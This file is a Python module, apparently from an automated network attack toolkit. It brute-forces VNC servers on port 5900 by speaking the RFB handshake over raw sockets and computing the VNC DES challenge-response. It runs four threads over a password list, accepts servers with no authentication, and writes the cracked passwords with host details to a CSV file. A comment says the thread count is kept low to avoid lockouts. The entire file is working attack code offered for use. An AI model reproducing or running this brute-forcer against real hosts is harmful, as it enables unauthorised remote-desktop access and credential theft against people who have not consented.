"""
vnc_connector.py - Brute forces VNC servers (port 5900) using the RFB 3.x
password authentication scheme via raw socket. No screenshot/steal module
is needed — confirmed access is the primary value here.
"""

import os
import csv
import socket
import struct
import threading
import logging
import time
import warnings
import pandas as pd
from queue import Queue
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from shared import SharedData
from logger import Logger
from actions.connector_utils import CredentialChecker

logger = Logger(name="vnc_connector.py", level=logging.DEBUG)

b_class = "VNCBruteforce"
b_module = "vnc_connector"
b_status = "brute_force_vnc"
b_port = 5900
b_parent = None


def _vnc_des_encrypt(password, challenge):
    """DES-encrypt the 16-byte VNC challenge with a bit-reversed password key."""
    key = bytearray(8)
    pw_bytes = (password.encode('latin-1', errors='replace') + b'\x00' * 8)[:8]
    for i, c in enumerate(pw_bytes):
        rb = 0
        for bit in range(8):
            rb = (rb << 1) | ((c >> bit) & 1)
        key[i] = rb

    # TripleDES with K1=K2=K3 is mathematically equivalent to single DES
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, modes
            try:
                from cryptography.hazmat.primitives.ciphers.algorithms import TripleDES
            except ImportError:
                from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
            from cryptography.hazmat.backends import default_backend
            cipher = Cipher(TripleDES(bytes(key) * 3), modes.ECB(), backend=default_backend())
            enc = cipher.encryptor()
            return enc.update(bytes(challenge)) + enc.finalize()
        except Exception as e:
            raise RuntimeError(f"VNC DES encryption failed: {e}")


class VNCBruteforce:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.vnc_connector = VNCConnector(shared_data)
        logger.info("VNCConnector initialized.")

    def bruteforce_vnc(self, ip, port):
        return self.vnc_connector.run_bruteforce(ip, port)

    def execute(self, ip, port, row, status_key):
        logger.info(f"Executing VNCBruteforce on {ip}:{port}...")
        existing_creds = CredentialChecker.check_existing_credentials(
            self.shared_data.vncfile, ip
        )
        if existing_creds:
            if self._verify_credentials(ip, existing_creds):
                logger.success(f"Existing VNC credentials verified for {ip}")
                return 'success'
            logger.warning(f"Existing VNC credentials for {ip} no longer valid, re-bruteforcing")

        self.shared_data.ragnarorch_status = "VNCBruteforce"
        time.sleep(2)
        success, results = self.bruteforce_vnc(ip, port)
        return 'success' if success else 'failed'

    def _verify_credentials(self, ip, credentials):
        for _, password in credentials:
            if self.vnc_connector.vnc_connect(ip, password):
                return True
        return False


class VNCConnector:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.load_scan_file()
        self.vncfile = shared_data.vncfile
        if not os.path.exists(self.vncfile):
            with open(self.vncfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
        self.results = []
        self.lock = threading.Lock()
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        try:
            data = self.shared_data.read_data()
            self.scan = pd.DataFrame(data)
            if "Ports" not in self.scan.columns:
                self.scan["Ports"] = None
        except Exception as e:
            logger.warning(f"Could not read scan data: {e}")
            self.scan = pd.DataFrame(columns=['MAC Address', 'IPs', 'Hostnames', 'Ports', 'Alive'])
        self.scan["Ports"] = self.scan["Ports"].astype(str)
        self.scan = self.scan[self.scan["Ports"].str.contains("5900", na=False)]

    def vnc_connect(self, ip, password, port=5900):
        """
        Attempt VNC password auth via the RFB 3.x protocol.
        Returns True on successful authentication (or if no auth is required).
        """
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, port))

            greeting = sock.recv(12)
            if not greeting.startswith(b'RFB '):
                return False

            try:
                version = float(greeting[4:11].decode('ascii').strip())
            except ValueError:
                version = 3.3

            sock.send(greeting)

            if version < 3.7:
                sec_data = sock.recv(4)
                if len(sec_data) < 4:
                    return False
                sec_type = struct.unpack('!I', sec_data)[0]
            else:
                n_types_data = sock.recv(1)
                if not n_types_data:
                    return False
                n_types = struct.unpack('B', n_types_data)[0]
                if n_types == 0:
                    return False
                types = list(sock.recv(n_types))
                if 2 in types:
                    sec_type = 2
                    sock.send(bytes([2]))
                elif 1 in types:
                    # None security — no password needed
                    sock.send(bytes([1]))
                    if version >= 3.8:
                        result_data = sock.recv(4)
                        return len(result_data) >= 4 and struct.unpack('!I', result_data)[0] == 0
                    return True
                else:
                    return False

            if sec_type == 1:
                logger.debug(f"VNC on {ip}:{port} has no authentication")
                return True

            if sec_type != 2:
                return False

            challenge = sock.recv(16)
            if len(challenge) < 16:
                return False

            response = _vnc_des_encrypt(password, challenge)
            sock.send(response)

            result_data = sock.recv(4)
            if len(result_data) < 4:
                return False
            return struct.unpack('!I', result_data)[0] == 0

        except (socket.timeout, ConnectionRefusedError, OSError):
            return False
        except RuntimeError as e:
            logger.warning(str(e))
            return False
        except Exception as e:
            logger.debug(f"VNC connect error for {ip}: {e}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def worker(self, progress, task_id, success_flag):
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                break
            ip, password, mac, hostname, port = self.queue.get()
            if self.vnc_connect(ip, password, port):
                with self.lock:
                    self.results.append([mac, ip, hostname, "", password, port])
                    logger.success(f"VNC password found for {ip}:{port}: '{password}'")
                    self.save_results()
                    self.remove_duplicates()
                    success_flag[0] = True
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()
        try:
            mac = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
            hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
        except IndexError:
            mac, hostname = "unknown", "unknown"

        passwords = open(self.shared_data.passwordsfile, "r").read().splitlines()

        for pw in passwords:
            if self.shared_data.orchestrator_should_exit:
                return False, []
            self.queue.put((adresse_ip, pw, mac, hostname, port))

        success_flag = [False]
        threads = []
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing VNC...", total=len(passwords))
            # VNC servers often enforce a 1-second delay between failed attempts,
            # so keep the thread count low to avoid triggering lockouts.
            for _ in range(4):
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)
            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break
            self.queue.join()
            for t in threads:
                t.join()

        return success_flag[0], self.results

    def save_results(self):
        with open(self.vncfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []

    def remove_duplicates(self):
        df = pd.read_csv(self.vncfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.vncfile, index=False)


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        vnc = VNCBruteforce(shared_data)
        logger.info("Starting VNC brute force on port 5900")
        for row in shared_data.read_data():
            ip = row["IPs"]
            vnc.execute(ip, b_port, row, b_status)
    except Exception as e:
        logger.error(f"Error: {e}")
